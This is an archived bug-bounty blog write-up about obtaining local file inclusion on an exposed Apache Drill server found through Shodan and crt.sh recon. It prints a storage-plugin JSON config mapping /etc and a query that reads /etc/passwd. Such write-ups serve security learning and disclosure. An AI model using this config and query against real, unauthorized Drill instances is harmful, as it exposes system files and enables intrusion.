---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-04-23_how-we-got-lfi-in-apache-drill-recon-like-a-boss.md
original_filename: 2018-04-23_how-we-got-lfi-in-apache-drill-recon-like-a-boss.md
title: How we got LFI in apache Drill (Recon like a boss)
category: documents
detected_topics:
- path-traversal
- command-injection
- information-disclosure
- cloud-security
tags:
- imported
- documents
- path-traversal
- command-injection
- information-disclosure
- cloud-security
language: en
raw_sha256: 5f70e1284524a85a9d00dea966970825d05383b9513bde1396e43a43afba017c
text_sha256: 989027dc21c3b1a3218f84e19fa632d4e4773199988fff9876ce10ef2283e9dc
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# How we got LFI in apache Drill (Recon like a boss)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-04-23_how-we-got-lfi-in-apache-drill-recon-like-a-boss.md
- Source Type: markdown
- Detected Topics: path-traversal, command-injection, information-disclosure, cloud-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `5f70e1284524a85a9d00dea966970825d05383b9513bde1396e43a43afba017c`
- Text SHA256: `989027dc21c3b1a3218f84e19fa632d4e4773199988fff9876ce10ef2283e9dc`


## Content

---
title: "How we got LFI in apache Drill (Recon like a boss)"
url: "https://medium.com/bugbountywriteup/how-we-got-lfi-in-apache-drill-recon-like-a-boss-6f739a79d87d"
authors: ["gujjuboy10x00 (@vis_hacker)"]
bugs: ["LFI"]
publication_date: "2018-04-23"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5901
scraped_via: "browseros"
---

# How we got LFI in apache Drill (Recon like a boss)

How we got LFI in apache Drill (Recon like a boss)
Gujjuboy10x00
Follow
3 min read
·
Apr 23, 2018

519

4

Hi Everyone,

As promised in last blog, today I am gonna write this blog about few things on LFI. special thanks to one and only Jobert.

Few months back i got private invite in hackerone platform. As you know Recon plays a major role while hacking on a program. Recon doesn’t always mean to find subdomains belonging to a company, it also could relate to finding out how a company is setting up its properties and what resources they are using.

What is LFI?
Local File inclusion (LFI), or simply File Inclusion, refers to an inclusion attack through which an attacker can trick the web application in including files on the web server by exploiting functionality that dynamically includes local files or scripts. The consequence of a successful LFI attack includes Directory Traversal and Information Disclosure as well as Remote Code Execution.
Typically, Local File Inclusion (LFI) occurs, when an application gets the path to the file that has to be included as an input without treating it as untrusted input. This would allow a local file to be supplied to the include statement.

After looking into shodan and crt.sh for that domain I found one , http://ec2-xx-xx-xxx-xxx.us-west-2.compute.amazonaws.com:8047 and Istarted digging there and no success for intial hours.Later i found tabs like Query , storage tab , so i quickly gone to their document to read all things and how it works at https://drill.apache.org/docs/ .

Few things on query :
The query specifies the data source location and includes data casting.Specifying the Data Source Location ¶The optional USE statement runs subsequent queries against a particular storage plugin. The USE statement typically saves typing some of the storage plugin information in the FROM statement. If you omit the USE statement, specify a storage plugin, such as dfs, and optionally a workspace, such as default, and a path to the data source using dot notation and back ticks. 
For example:
dfs.`default`.`/Users/drill-user/apache-drill-1.1.0/log/sqlline_queries.json`;

After understating few document , Itook help from the great hacker Jobert Abma (Co-founder of HackerOne), he told we can try to get LFI.

Get Gujjuboy10x00’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Wait for a moment and listen music.

after few minutes jobert come up with below json file , which he wrote as dfs storage method :

{  "type": "file",  
 "enabled": true, 
  "connection": "file:///", 
  "config": null,  
"workspaces": {  "etc":
 {  "location": "/etc",
  "writable": false,
  "defaultInputFormat": "tsv"  } 
  },  "formats": {  
  "tsv": {  
  "type": "text",  
  "extensions": [ "tsv"], 
  "delimiter": "\t"  
  }  
}
}

and just call that from query tab

like:

select * from dfs.etc.`passwd`

and wow! all we got is:

Press enter or click to view image in full size

So , It’s time to partyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy!

We then tried for multiple json file as dfs storage method and we got success.

woot woot!

I always believed that sharing is caring, and I have been learning from multiple security researchers. Hope You liked this finding. Many more are coming. Stay tuned. DM is open for any questions on twitter (
Gujjuboy10x00
 , hackerone.com/gujjuboy10x00).
